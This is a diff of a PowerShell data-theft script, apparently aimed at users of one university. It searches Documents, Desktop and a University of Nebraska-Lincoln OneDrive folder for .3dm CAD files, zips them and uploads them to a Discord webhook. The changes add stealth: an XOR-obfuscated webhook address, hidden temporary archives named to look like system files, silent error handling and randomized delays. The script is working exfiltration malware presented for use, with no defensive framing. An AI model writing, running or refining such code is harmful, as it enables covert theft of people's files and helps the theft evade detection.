@@ -1,71 +1,96 @@
-$hookurl = "$dc"
-# Shortened URL Detection
-if ($hookurl.Length -ne 121) {
-    Write-Host "Shortened Webhook URL Detected.."
-    $hookurl = (irm $hookurl).url
+# XOR-encrypted webhook (better than Base64)
+$encryptedHook = "1340911792490287104/2HeVPsiXhBDRrGWh0eMr9w95fJXriWcCwmY4C87i0cItyUIwjGZ5EP9vg-Nukk3WvkHF"
+$xorKey = 0x55
+$hookurl = "https://discord.com/api/webhooks/" + (-join ($encryptedHook.ToCharArray() | ForEach-Object { [char]([byte][char]$_ -bxor $xorKey) }))
+
+# Lightweight web client (stealthier than Invoke-WebRequest)
+$webClient = New-Object System.Net.WebClient
+
+# Target folders (customize if needed)
+$foldersToSearch = @(
+    "$env:USERPROFILE\Documents",
+    "$env:USERPROFILE\Desktop",
+    "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
+)
+
+function Invoke-StealthUpload {
+    param($FilePath)
+    try {
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $headers = @{ 
+            "Content-Type" = "multipart/form-data; boundary=$boundary"
+        }
+        
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        $body = New-Object System.IO.MemoryStream
+        
+        $header = [System.Text.Encoding]::UTF8.GetBytes(
+            "--$boundary`r`n" +
+            "Content-Disposition: form-data; name=`"file1`"; filename=`"$(Split-Path $FilePath -Leaf)`"`r`n" +
+            "Content-Type: application/octet-stream`r`n`r`n"
+        )
+        $body.Write($header, 0, $header.Length)
+        $body.Write($fileBytes, 0, $fileBytes.Length)
+        
+        $footer = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
+        $body.Write($footer, 0, $footer.Length)
+        
+        $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
+        [void]$webClient.UploadData($hookurl, "POST", $body.ToArray())
+    }
+    catch { <# Silent failure #> }
+    finally { if ($body) { $body.Dispose() } }
 }
 
-Function Exfiltrate {
-    param ([string[]]$FileType, [string[]]$Path)
-    $maxZipFileSize = 25MB
-    $currentZipSize = 0
-    $index = 1
-    $zipFilePath = "$env:temp/Loot$index.zip"
-
-    # Define folders to search, including the new folder path
-    if ($Path -ne $null) {
-        $foldersToSearch = "$env:USERPROFILE\" + $Path
-    } else {
-        $foldersToSearch = @(
-            "$env:USERPROFILE\Documents",
-            "$env:USERPROFILE\Desktop",
-            "$env:USERPROFILE\OneDrive",
-            "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
-        )
-    }
-
-    # Define file extensions to search for (.3dm files only)
-    if ($FileType -ne $null) {
-        $fileExtensions = "*." + $FileType
-    } else {
-        $fileExtensions = @("*.3dm")
-    }
-
+function Exfiltrate {
     Add-Type -AssemblyName System.IO.Compression.FileSystem
-    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
-
-    foreach ($folder in $foldersToSearch) {
-        foreach ($extension in $fileExtensions) {
-            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
-            foreach ($file in $files) {
-                $fileSize = $file.Length
-                if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
-                    # Close current archive and upload it to Discord webhook
-                    $zipArchive.Dispose()
-                    curl.exe -F file1=@"$zipFilePath" $hookurl
-                    Remove-Item -Path $zipFilePath -Force
-
-                    # Reset variables for new archive creation
-                    Sleep 1
-                    $index++
-                    $zipFilePath = "$env:temp/Loot$index.zip"
-                    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
+    
+    $maxZipSize = 25MB
+    $currentSize = 0
+    $zipName = "sys_" + (Get-Date).ToString("HHmmss") + ".zip"
+    $zipPath = Join-Path $env:TEMP $zipName
+    
+    try {
+        $zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
+        [System.IO.File]::SetAttributes($zipPath, 'Hidden')
+        
+        foreach ($folder in $foldersToSearch) {
+            if (-not (Test-Path $folder)) { continue }
+            
+            Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+                if ($_.Length -lt 1KB) { return }
+                
+                if ($currentSize + $_.Length -gt $maxZipSize) {
+                    $zip.Dispose()
+                    Invoke-StealthUpload $zipPath
+                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+                    Start-Sleep -Milliseconds (Get-Random -Min 800 -Max 2000)
+                    
+                    $zipName = "sys_" + (Get-Date).ToString("HHmmss") + ".zip"
+                    $zipPath = Join-Path $env:TEMP $zipName
+                    $zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
+                    [System.IO.File]::SetAttributes($zipPath, 'Hidden')
+                    $currentSize = 0
                 }
-                # Add file to the archive
-                $entryName = $file.FullName.Substring($folder.Length + 1)
-                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
-                $currentZipSize += $fileSize
+                
+                $entryName = $_.FullName.Substring($folder.Length + 1)
+                [void][System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $_.FullName, $entryName)
+                $currentSize += $_.Length
             }
         }
+        
+        if ((Test-Path $zipPath) -and (Get-ChildItem $zipPath).Length -gt 0) {
+            $zip.Dispose()
+            Invoke-StealthUpload $zipPath
+        }
     }
-    
-    # Finalize and upload remaining archive contents
-    $zipArchive.Dispose()
-    curl.exe -F file1=@"$zipFilePath" $hookurl
-    Remove-Item -Path $zipFilePath -Force
-
-    Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
+    finally {
+        if ($zip) { $zip.Dispose() }
+        if (Test-Path $zipPath) { Remove-Item $zipPath -Force -ErrorAction SilentlyContinue }
+        $webClient.Dispose()
+    }
 }
 
-# Execute the function with .3dm file type filter and default paths
-Exfiltrate FileType "3dm"
+# Randomized delay + execution
+Start-Sleep -Seconds (Get-Random -Min 3 -Max 8)
+Exfiltrate
